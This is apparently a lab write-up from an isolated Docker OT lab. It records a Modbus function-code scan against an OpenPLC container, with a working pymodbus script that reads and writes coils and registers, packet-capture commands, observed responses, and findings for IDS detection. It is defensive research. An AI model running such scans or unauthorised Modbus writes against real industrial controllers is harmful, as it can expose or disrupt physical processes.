# Phase 2 Scenario 2 — Modbus function-code scan against `openplc:502`

**Date:** 2026-05-22
**Source task:** Phase 2 attack scenarios (step 2 of Phase 2)
**Attacker vantage:** `otlab-attacker` multi-homed on `ot_zone`
(`172.18.0.4`), target `openplc:502` (`172.18.0.2`).

---

## Setup

Same boundary-crossed state as scenario 1: attacker on `ot_zone` via
`docker network connect otlab_ot_zone otlab-attacker`. Capture vantage
is `tcpdump -i any` inside `otlab-openplc`.

Runtime fixes applied during this scenario (documented here for the
audit trail):

- `procps` installed in both `otlab-openplc` and `otlab-attacker` so
  that `pkill tcpdump` actually works. The Phase 1 plc/Dockerfile
  base and the Phase 2 attacker/Dockerfile both omit procps; this
  surfaced when scenario 2's <1 s script left no time for a
  zombie-tcpdump pattern to settle. Matches the
  `docs/monitoring.md` §3 Method B "install diagnostics at runtime"
  pattern — runtime-only, gone on container recreation.
- Capture loop adjusted: 2 s sleep after `tcpdump -i any -U -w …` to
  let the kernel BPF filter install before the attack starts, and 3 s
  sleep after the attack to let the last PDUs flush before `pkill`.

---

## Prediction (stated before running)

1. All four read function codes (FC 1, 2, 3, 4) accepted. The lab's
   `tank_fill.st` only writes coils 0–2 and HR 0–2, but a Modbus
   server still has to *respond* to reads on every code it implements.
2. Reads in the documented map (coils 0–2, HR 0–2) return real PLC
   state.
3. Reads outside the documented map (e.g. HR 100, HR 1000) — open
   question. Most ICS hardening guidance says a PLC SHOULD respond
   with Modbus exception `02 — illegal data address` to reads of
   addresses it doesn't implement. OpenPLC v3's behavior here is what
   scenario 2 is meant to discover.
4. All four write function codes (FC 5, 6, 15, 16) accepted at the
   protocol layer, no exception. (Whether the WRITE STICKS is what
   scenarios 3 and 4 will test against mapped addresses; this
   scenario writes to *unmapped* addresses to keep the protocol-surface
   inventory cleanly separated from the §5.3-class question of "does
   the PLC reassert.")

---

## Commands

```bash
docker exec -d otlab-openplc sh -c \
  "tcpdump -i any -U -w /tmp/scenario-2.pcap 'tcp port 502'"
sleep 2

docker exec -i otlab-attacker python3 - <<'PY'
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient(host='openplc', port=502)
c.connect()
# 8 standard FCs + 3 out-of-map reads — see Observed Output below
c.read_coils(0, 6,            slave=1)   # FC 1
c.read_discrete_inputs(0, 6,  slave=1)   # FC 2
c.read_holding_registers(0,3, slave=1)   # FC 3
c.read_input_registers(0, 3,  slave=1)   # FC 4
c.write_coil(5, False,        slave=1)   # FC 5
c.write_register(5, 0,        slave=1)   # FC 6
c.write_coils(5, [False,False], slave=1) # FC 15
c.write_registers(5, [0,0],   slave=1)   # FC 16
c.read_holding_registers(100,5,slave=1)  # FC 3  out-of-map
c.read_coils(100, 8,          slave=1)   # FC 1  out-of-map
c.read_holding_registers(1000,1,slave=1) # FC 3  deep out-of-map
c.close()
PY

sleep 3
docker exec otlab-openplc pkill tcpdump
docker cp otlab-openplc:/tmp/scenario-2.pcap \
  ./captures/phase2-scenario-2-fc-scan-2026-05-22.pcap
```

---

## Observed output

```
TCP connect to openplc:502 -> True
FC1  read_coils(0,6)                          OK   bits=[True, True, False, False, False, False, False, False]
FC2  read_discrete_inputs(0,6)                OK   bits=[False, False, False, False, False, False, False, False]
FC3  read_holding_regs(0,3)                   OK   registers=[34, 20, 80]
FC4  read_input_regs(0,3)                     OK   registers=[0, 0, 0]
FC5  write_coil(5, False)                     OK   write ack
FC6  write_register(5, 0)                     OK   write ack
FC15 write_coils(5, [F,F])                    OK   write ack (count=2)
FC16 write_registers(5, [0,0])                OK   write ack (count=2)
FC3  read_holding_regs(100,5)  [OUT OF MAP]   OK   registers=[0, 0, 0, 0, 0]
FC1  read_coils(100,8)         [OUT OF MAP]   OK   bits=[False, False, False, False, False, False, False, False]
FC3  read_holding_regs(1000,1) [DEEP OUT OF MAP] OK   registers=[0]
```

**Interpretation row by row (predicted vs observed):**

| FC | Op | Predicted | Observed | Notes |
|----|----|-----------|----------|-------|
| 1  | read coils 0–5 | OK, real state | OK; coils 0+1 TRUE, 2–5 FALSE | Pump_Run & Valve_Open both ON — tank in fill phase |
| 2  | read discrete inputs 0–5 | OK, zeros (.st has no `%IX`) | OK, all False | confirms no discrete inputs used |
| 3  | read HR 0–2 | OK, real state | OK; `[34, 20, 80]` | level=34, SP_Low=20, SP_High=80 |
| 4  | read input regs 0–2 | OK, zeros (.st has no `%IW`) | OK; `[0, 0, 0]` | confirms no input registers used |
| 5  | write coil @5 (FALSE) | OK ack | OK ack | unmapped coil; ack means accepted |
| 6  | write HR @5 (=0) | OK ack | OK ack | unmapped HR; ack means accepted |
| 15 | write coils @5..6 | OK ack count=2 | OK ack count=2 | accepted |
| 16 | write HRs @5..6 | OK ack count=2 | OK ack count=2 | accepted |
| 3  | read HR @100..104 | EXCEPTION 02 expected (illegal address) | **OK; registers=`[0,0,0,0,0]`** | **NO exception** — silent zeros |
| 1  | read coils @100..107 | EXCEPTION 02 expected | **OK; all False** | **NO exception** — silent zeros |
| 3  | read HR @1000 | EXCEPTION 02 expected | **OK; `[0]`** | **NO exception** — silent zero |

The three out-of-map rows are the surprise. Prediction was Modbus
exception `02 — illegal data address`. Observation: clean read,
returns zeros, no error flag set.

### Packet capture summary

`captures/phase2-scenario-2-fc-scan-2026-05-22.pcap` — 60 packets,
5.8 KB. Single TCP connection `172.18.0.4:57108 → 172.18.0.2:502`,
opened with a normal 3-way handshake, used for all 11 PDU exchanges
in under 10 ms, then closed with a clean FIN handshake.

Selected tcpdump output (PDU lengths shown — Modbus PDU sizes are the
signal):

```
18:21:46.248094  172.18.0.4.57108 > 172.18.0.2.502: [S]            (SYN)
18:21:46.248134  172.18.0.2.502   > 172.18.0.4.57108: [S.]         (SYN-ACK)
18:21:46.248250  172.18.0.4.57108 > 172.18.0.2.502: [P.] len=12    (FC1 req)
18:21:46.254737  172.18.0.2.502   > 172.18.0.4.57108: [P.] len=10  (FC1 resp + 1 byte coil-bits)
18:21:46.254988  172.18.0.4.57108 > 172.18.0.2.502: [P.] len=12    (FC2 req)
18:21:46.255051  172.18.0.2.502   > 172.18.0.4.57108: [P.] len=10  (FC2 resp)
18:21:46.255219  172.18.0.4.57108 > 172.18.0.2.502: [P.] len=12    (FC3 req)
18:21:46.255260  172.18.0.2.502   > 172.18.0.4.57108: [P.] len=15  (FC3 resp + 6 bytes regs)
18:21:46.255365  172.18.0.4.57108 > 172.18.0.2.502: [P.] len=12    (FC4 req)
18:21:46.255397  172.18.0.2.502   > 172.18.0.4.57108: [P.] len=15  (FC4 resp + 6 bytes regs)
18:21:46.255474  172.18.0.4.57108 > 172.18.0.2.502: [P.] len=12    (FC5 req — write single coil)
18:21:46.255493  172.18.0.2.502   > 172.18.0.4.57108: [P.] len=12  (FC5 resp echo)
18:21:46.255582  172.18.0.4.57108 > 172.18.0.2.502: [P.] len=12    (FC6 req)
18:21:46.255607  172.18.0.2.502   > 172.18.0.4.57108: [P.] len=12  (FC6 resp echo)
18:21:46.255684  172.18.0.4.57108 > 172.18.0.2.502: [P.] len=14    (FC15 req — multi-coil)
18:21:46.255731  172.18.0.2.502   > 172.18.0.4.57108: [P.] len=12  (FC15 resp)
18:21:46.255830  172.18.0.4.57108 > 172.18.0.2.502: [P.] len=17    (FC16 req — multi-reg)
18:21:46.255854  172.18.0.2.502   > 172.18.0.4.57108: [P.] len=12  (FC16 resp)
18:21:46.255921  172.18.0.4.57108 > 172.18.0.2.502: [P.] len=12    (FC3 @100 — out of map)
18:21:46.255948  172.18.0.2.502   > 172.18.0.4.57108: [P.] len=19  (FC3 resp + 10 bytes zeros)
... (FC1 @100, FC3 @1000 follow same pattern)
18:21:46.256259  172.18.0.4.57108 > 172.18.0.2.502: [F.]           (FIN)
18:21:46.256287  172.18.0.2.502   > 172.18.0.4.57108: [F.]         (FIN)
```

Whole scan: from first SYN to final FIN-ACK = **8.21 ms**. An IDS
needs millisecond-scale detection to even see this go by.

---

## Findings (plain English)

1. **OpenPLC v3 implements all eight standard Modbus function codes
   without restriction.** Every read FC and every write FC was
   accepted. No coil or register is "read-only" at the protocol layer
   — every Modbus client on `ot_zone` has full read/write to the
   server's address space. This is consistent with Modbus's
   specification (the protocol has no access control) and with
   `docs/network-security.md` §5.2; scenario 2 is the empirical
   confirmation.

2. **PLC does NOT raise `Illegal Data Address` (exception 02) for
   out-of-map reads.** Reads at HR 100, coils 100–107, and even HR
   1000 all returned silent zeros. From an attacker's point of view
   this is *worse* than returning exceptions: probing for the
   "real" address map yields no information — every address looks
   the same. A defender hoping to detect "scans of addresses outside
   the documented map" via Modbus-layer signals will not see
   exceptions to flag. **Direct implication for monitoring.md §5
   row 6** ("Reads outside the map — inspect register/coil
   addresses"): the detection logic CANNOT rely on Modbus exceptions
   to identify out-of-map reads — Suricata in step 3 will have to
   inspect addresses directly in the PDU and compare against the
   documented map.

3. **Out-of-map writes also accepted with no exception.** Whether
   these writes have any effect on PLC behavior is a different
   question (likely none — the .st program references neither HR 5
   nor coil 5), but the protocol-layer surface is "everything is
   writable to address space limit." This significantly expands
   §5.2's "Write holding registers / coils" claim: it is not just
   the mapped ones; the entire 16-bit address space (up to 65535)
   is writable.

4. **Function-code-scanning indicator triggered, fast.** The pcap
   shows all 11 PDUs of varying function-code values in a single TCP
   connection, completed in 8.21 ms. monitoring.md §5 row 3
   ("Function-code scanning — sequential/varied FCs = recon/
   enumeration") is the relevant Suricata rule; the cadence here
   (~1 ms between PDUs) is the signature.

5. **PDU-length pattern is itself a fingerprint.** Read responses
   carry register/coil payload, so their length depends on count;
   write responses are typically a fixed-size echo. The pcap above
   shows req-len = 12 (uniform) and resp-len varying with payload
   (10, 15, 19) — this length pattern is a usable detection signal
   that does not require a Modbus dissector to flag.

---

## Cross-references

- `docs/network-security.md` §5.2 ("Modbus has no security") — empirically
  confirmed across all 8 FCs.
- `docs/monitoring.md` §5 row 3 (function-code scanning) — generated.
- `docs/monitoring.md` §5 row 6 (out-of-map reads) — Phase 2 finding:
  exceptions cannot be used as the detection signal; address-level
  inspection required.
- `captures/phase2-scenario-2-fc-scan-2026-05-22.pcap` (gitignored,
  60 packets, 5.8 KB).

---

## Hand-off note for scenario 3 / 4

Scenarios 3 and 4 will write to *mapped* addresses (coil 2, HR 1, HR
2) — the §5.3 reassertion question. Scenario 2 confirmed the protocol
accepts the writes; scenarios 3 and 4 measure how long the falsified
value persists before the PLC's next scan overwrites it.
